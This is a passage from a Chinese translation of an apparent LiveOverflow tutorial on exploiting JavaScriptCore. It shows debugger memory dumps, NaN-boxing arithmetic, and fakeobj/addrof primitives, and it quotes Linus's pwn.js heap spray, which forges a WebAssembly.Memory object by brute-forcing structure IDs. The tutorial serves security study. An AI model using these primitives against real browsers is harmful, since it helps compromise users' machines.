    0x62d0000d40d0: 0x0101160000001000 0xffff000000000002
    0x62d0000d40e0: 0xffff000000000003 0x0000000000000000
但是，如上所示，这个值稍微有点问题。如果我们仔细比对0x0100160000001000与0x0100160000001000就会发现，在0x0101160000001000中多出来一个1。实际上，这是由于JSValues的NaN编码方式所致。
我们实现的方案是通过将值2^48与数字进行64位整数相加来对双精度值进行编码。
    针对双精度浮点型的NaN编码方式
所以，简单来说，引擎会为这些双精度浮点型数值加上值0x1000000000000，因此，我们只需要减去这个值即可。
    >>> # This is python
    >>> struct.unpack("d", struct.pack("Q", 0x0100160000001000-0x1000000000000))
    (7.082855106403439e-304,)
现在，让我们再试一次。
    >>> // this is javascript
    >>> fake.a = 7.082855106403439e-304
    7.082855106403439e-304
    >>> describe(fake)
    Object: 0x62d0000d40c0
    // Hit CTRL + C
    (lldb) x/6gx 0x62d0000d40c0
    0x62d0000d40c0: 0x0100160000000129 0x0000000000000000
    0x62d0000d40d0: 0x0100160000001000 0xffff000000000002
    0x62d0000d40e0: 0xffff000000000003 0x0000000000000000
现在，我们得到了正确的值，即0x0100160000001000。接下来，我们要构造butterfly结构，并且希望其值为0，但是如果JavaScript在开头部分添加FFFF的话，我们如何该如何达到这一目的呢？实际上，这很简单——我们可以将其设置为某个值，只需删除该属性，这时系统将删除该属性的内容，并将相应内存空间置0x0。
    >>> fake.b = 2
    2
    >>> delete fake.b
    true
    // Hit CTRL + C
    (lldb) x/6gx 0x62d0000d40c0
    0x62d0000d40c0: 0x0100160000000129 0x0000000000000000
    0x62d0000d40d0: 0x0100160000001000 0x0000000000000000
    0x62d0000d40e0: 0xffff000000000003 0x0000000000000000
现在，我们伪造的对象的第三个属性将成为伪造的测试对象上的第一个属性，所以，我们可以将它设置为我们想要的任何值，大家觉得1337怎么样？
    >>> fake.c = 1337
    1337
    // Hit CTRL + C
    (lldb) x/6gx 0x62d0000d40c0
    0x62d0000d40c0: 0x0100160000000129 0x0000000000000000
    0x62d0000d40d0: 0x0100160000001000 0x0000000000000000
    0x62d0000d40e0: 0xffff000000000539 0x0000000000000000
目前来看，一切都很顺利，接下来，让我们将所有这些都放到test.js脚本中。
    function fakeobj(dbl) {
        ...
    }
    for (var i=0; i>> x/6gx 0x62d0007de880
    0x62d0007de880: 0x010016000000212a 0x0000000000000000
    0x62d0007de890: 0x0100160000001000 0x0000000000000000
    0x62d0007de8a0: 0xffff000000000539 0x0000000000000000
实际上，5.367800960505e-310就是0x62d0007de880， 这里想要偏移16(0x10)字节, 为此，可以借助于下列代码：
    >>> # This is python
    >>> struct.unpack("d", struct.pack("Q", 0x62d0007de880 + 0x10))
    (5.3678009605058e-310,)
现在，让我们使用fakeObj函数来看看是否真创建了一个对象。
    >>> // this is javascript
    >>> hax = fakeobj(5.3678009605058e-310)
    [object Object]
    >>> hax.x
    1337 // It works!
    >>> describe(hax)
    Object: 0x62d0007de890 with butterfly ...
在0x62d0007de890处果然有一个对象，这意味着我们可以让jsc将hax看作是一个对象，但实际上它只是我们伪造的对象的属性。这意味着，如果我们改变一个对象的属性的话，就会影响另一个对象。
    >>> hax.x
    1337
    >>> fake.c = "LiveOverflow"
    LiveOverflow
    >>> hax.x
    LiveOverflow
这一切貌似用处不大，但是请仔细想一下就会发现，我们不仅可以手工创建任意JavaScript对象，同时，还可以在内存级别来控制其内部类属性。当然，这离代码执行能力还很大距离，但我们应该问自己一个问题:
    我们可以通过伪造某些JavaScript对象来提高我们的战斗力吗？
实际上，许多优秀的研究人员早就问过这个问题并找到了答案，因此，我们可以向他们学习。好了，我们先来看看Linus的解决方案
＃＃ Linus的解决方案
在pwn.js中，他使用了上面类似的方式来喷射大量Float64Array结构。
    var structs = [];
    for (var i = 0; i < 0x5000; i++) {
        var a = new Float64Array(1);
        a['prop' + i] = 1337;
        structs.push(a);
    }
然后，他还喷射了少量WebAssembly.Memory对象，并准备了一些Web汇编代码（web assembly code）。
    for (var i = 0; i < 50; i++) {
        var a = new WebAssembly.Memory({inital: 0});
        a['prop' + i] = 1337;
        structs.push(a);
    }
    var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02...';
    var webAssemblyBuffer = str2ab(webAssemblyCode);
    var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
他还利用Int64.js库中的Int64来设置JSCell头部，这个程序库库是由saleo创建的，这里暂且不表。简单来说，它的作用就是创建一个伪造的JScell值，就像我们使用Python所做的那样。
    var jsCellHeader = new Int64([
        0x00, 0x50, 0x00, 0x00, // m_structureID
        0x0,                    // m_indexingType
        0x2c,                   // m_type
        0x08,                   // m_flags
        0x1                     // m_cellState
    ]);
之后，他新建了一个名为wasmBuffer的对象，其第一个属性为jsCellHeader，类似于fake对象的第一个属性a。此外，他还创建了一个butterfly结构。但是，随后他又删除了该结构。
    var wasmBuffer = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: null,
        vector: null,
        memory: null,
        deleteMe: null
    };
删除butterfly结构，使其所在内存空间的值为0。
    delete wasmBuffer.butterfly
往下看，我们发现第一个addrof函数，它将wasmBuffer对象的地址以双精度浮点型数据的方式泄漏出来。
    var wasmBufferRawAddr = addrof(wasmBuffer);
现在，通过将0x10与原始指针相加，使所指地址向后移动16个字节。
    var wasmBufferAddr = Add(Int64.fromDouble(wasmBufferRawAddr), 16);
然后，再次使用库代码将地址转换为双精度浮点型，并将其传递给fakeObj函数。
    var fakeWasmBuffer = fakeobj(wasmBufferAddr.asDouble());
现在，就得到了一个伪造的Float64Array。但这里有个窍门。请记住，要先喷射Float64Array，然后再向Float64Array中喷射WebAssembly.Memory对象，因为这里我们对Float64Array根本就不感兴趣。
这里，while循环用于检查fakeWasmBuffer是否为WebAssembly.Memory对象的实例。不过，当他故意选择一个结构ID来获得Float64Array时，这又有什么意义呢？他利用了两个对象相互重叠的事实——伪造的wasmBuffer与原始wasmBuffer的JSCell头部是重叠的。当我们改变伪造的对象的属性的值时，即fake.c
=
"LiveOverflow"，我们看到，hax对象也会随之发生相应的变化。在这里，他不断增加wasmBuffer的JSCell头部的值，所以，肯定也会影响伪造的wasmBuffer的实际结构ID。
    while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
    }
所以每次循环时，他都会检查伪造的wasmBuffer是否已经变成了一个WebAssembley.Memory对象。基本上可以说，在得到WebAssembley.Memory对象之前，他都是用一种安全的方式处理结构ID。这就是前面先喷射大量浮点数的原因，之后才喷射少量WebAssembley.Memory对象的原因——毕竟，喷射浮点数可以迅速获取大量结构ID，这样就可以确保先得到这样一个伪造的对象，后面就是WebAssembley.Memory的内存结构。
当然，这仍然不是一个代码执行漏洞，甚至没有交代如何实现这一点，但是读者不要着急，我们会在后面的文章中详细加以介绍。